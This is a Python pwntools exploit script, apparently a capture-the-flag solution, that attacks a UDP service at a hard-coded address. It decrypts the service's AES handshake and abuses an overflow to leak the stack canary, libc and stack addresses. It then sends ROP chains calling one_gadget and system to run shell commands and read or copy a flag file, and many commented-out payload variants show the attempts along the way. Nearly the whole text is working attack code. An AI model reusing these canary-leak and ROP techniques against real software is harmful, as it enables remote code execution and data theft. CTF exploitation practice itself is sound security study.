#!/usr/bin/env python3
from pwn import *

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

lib = ELF('./libc.so.6', checksec=False)

# p = process('nc -u localhost 9981'.split())
# p = process('nc -u 157.245.147.89 9981'.split())
# p = remote('157.245.147.89', 9981)
if args.REMOTE:
    p = process('nc -u 157.245.147.89 9981'.split())
else:
    p = process('nc -u localhost 9981'.split())

def packet(cmd, buflen, buf, magic=b'p00p'):
    return magic + p32(cmd) + p16(buflen) + buf
def buff(cmd, buflen, buf):
    return p32(cmd) + p16(buflen) + buf

# p.send(packet(0x301, 0x1000-10, b'a'*0x10))


p.sendline(packet(0x101, 0x10, b'a'*0x10))
ct = p.recv(0x30)
key = b'aaaaaaaaaaaaaaaa'
iv = b'aaaaaaaaaaaaaaaa'
cipher = AES.new(key, AES.MODE_CBC, iv)
pt = unpad(cipher.decrypt(ct), AES.block_size)

p.sendline(packet(0x201, len(pt), pt))
p.recvline()
magic = p.recv(8)
# log.info("magic: " + hex(u64(magic)))

path = b'dance_of_the_petals\x00'
path = path.rjust(0xf0, b'/')
payload = magic + buff(0, 779, path)
payload += cyclic((0x1000-len(payload)), n=8)
p.send(payload)

canary = u64(b'\x00' + p.recv(0x110)[-7:])
log.info("canary " + hex(canary))






path = b'dance_of_the_petals\x00'
path = path.rjust(0xf0, b'/')
payload = magic + buff(0, 794, path)
payload += cyclic((0x554-len(payload)-0x1e0-0x58-4), n=8)
payload += b'z'*16
p.send(payload)

p.recvuntil(b'z'*16)
lib.address = u64(p.recv(6) + b'\x00\x00') - 0x94ac3
log.info("lib " + hex(lib.address))






path = b'dance_of_the_petals\x00'
path = path.rjust(0xf0, b'/')
payload = magic + buff(0, 794+8*3+1, path)
payload += cyclic((0x554-len(payload)-0x1e0-0x58-4), n=8)
payload += b'z'*(8*5+1)
p.send(payload)

p.recvuntil(b'z'*(8*5+1))
stack = u64(b'\x00' + p.recv(5) + b'\x00\x00')
log.info("stack " + hex(stack))






one_gadget = 0xebc88+lib.address
rbp = 0x001bbd80+lib.address
rdx = 0x000796a2+lib.address
rsi = 0x001bb397+lib.address
rbp = 0x001bbd80+lib.address
rdi = 0x001bc0a1+lib.address
rax = 0x00128530+lib.address
ret = 0x001aeb4e+lib.address
rcx_rbx = 0x00108b04+lib.address

mov_rdi_rsi = 0x001b56fa + lib.address
rdx = 0x000796a2 + lib.address
sub_rdi_rdx = 0x001b4154 + lib.address

writable = 0x2193e0+lib.address
ropchain = [rdx, 0, rsi, 0, rbp, writable, one_gadget]
flag_path = b'/home/daccong/flag\x00'

# path = b'..\x00'
# path = path.rjust(0xf0, b'/')
# payload = magic + buff(0, 794+7*8, path)
# payload += cyclic((0x554-len(payload)-0x1e0-0x58-4-len(flag_path)), n=8)
# payload += flag_path
# payload += p64(canary)
# payload += b'z'*8
# payload += b''.join(map(p64, ropchain))
# p.send(payload)


# ropchain = [rdi, flag_ptr, rsi, flag_ptr-2, lib.sym.fopen, ret]
# path = b'..\x00'
# path = path.rjust(0xf0, b'/')
# payload = magic + buff(0, 794+7*8, path)
# payload += cyclic((0x554-len(payload)-0x1e0-0x58-4-len(flag_path)-2), n=8)
# payload += b'r\x00'
# payload += flag_path
# payload += p64(canary)
# payload += b'z'*8
# payload += b''.join(map(p64, ropchain))
# p.send(payload)

# sh = b'/bin/sh /bin/echo tuyendeptrai\x00'
# sh = b'echo tuyendeptrai\x00' # check
# sh = b'/bin/sh -c "echo tuyendeptrai"\x00'
sh = b'sh -c "echo tuyendeptrai"\x00'
sh_ptr = stack + (0x7ffff0000e88-len(sh)-0x7fffffffdb00)

# ropchain = [rdi, sh_ptr, ret, lib.sym.system, rdi, 0x10000, lib.sym.sleep]
# path = b'..\x00'
# path = path.rjust(0xf0, b'/')
# payload = magic + buff(0, 794+7*8, path)
# payload += cyclic((0x554-len(payload)-0x1e0-0x58-4-len(sh)), n=8)
# payload += sh
# payload += p64(canary)
# payload += b'z'*8
# payload += b''.join(map(p64, ropchain))
# p.send(payload)



bin_ptr = stack + (0x7ffff713eae8-0x7fffffffdb00)
ret_ptr = stack + (0x7ffff713ee70-0x7fffffffdb00)
test_ptr = stack + (0x7ffff713eea0-0x7fffffffdb00)
# ropchain = [ret, rdi, test_ptr, rsi, bin_ptr, rdx, 8, lib.sym.memcpy, ret, ret]
# path = b'..\x00'
# path = path.rjust(0xf0, b'/')
# payload = magic + buff(0, 794+8*10, path)
# payload += cyclic((0x554-len(payload)-0x1e0-0x58-4), n=8)
# payload += p64(canary)
# payload += b'z'*8
# payload += b''.join(map(p64, ropchain))
# p.send(payload)



# # pause()
# ret_ptr = stack + (0x7ffff713eef8-0x7fffffffdb00)
# ropchain = [
#     rdi, 11, rsi, bin_ptr, rdx, 8, rcx_rbx, 0, 0, lib.sym.sendto, 
#     rdi, 0x1000, lib.sym.sleep,
#             ]

# path = b'..\x00'
# path = path.rjust(0xf0, b'/')
# payload = magic + buff(0, 794+8*20, path)
# payload += cyclic((0x554-len(payload)-0x1e0-0x58-4), n=8)
# payload += p64(canary)
# payload += b'z'*8
# payload += b''.join(map(p64, ropchain))
# p.send(payload)
# # pause()
# p.recvline()
# elf.address = u64(p.recv(6) + b'\x00'*2) - 0x2a49
# log.info("elf base " + hex(elf.address))


# sh = b'cp /home/daccong/flag .\x00'
# sh_ptr = stack + (0x7ffff0000e88-len(sh)-0x7fffffffdb00)
# ropchain = [rdi, sh_ptr, ret, lib.sym.system, rdi, 0x10000, lib.sym.sleep]
# path = b'..\x00'
# path = path.rjust(0xf0, b'/')
# payload = magic + buff(0, 794+7*8, path)
# payload += cyclic((0x554-len(payload)-0x1e0-0x58-4-len(sh)), n=8)
# payload += sh
# payload += p64(canary)
# payload += p64(bin_ptr)
# payload += b''.join(map(p64, ropchain))
# p.send(payload)

# p.send(packet(0x301, 0xfff, b'cc'))

p.interactive()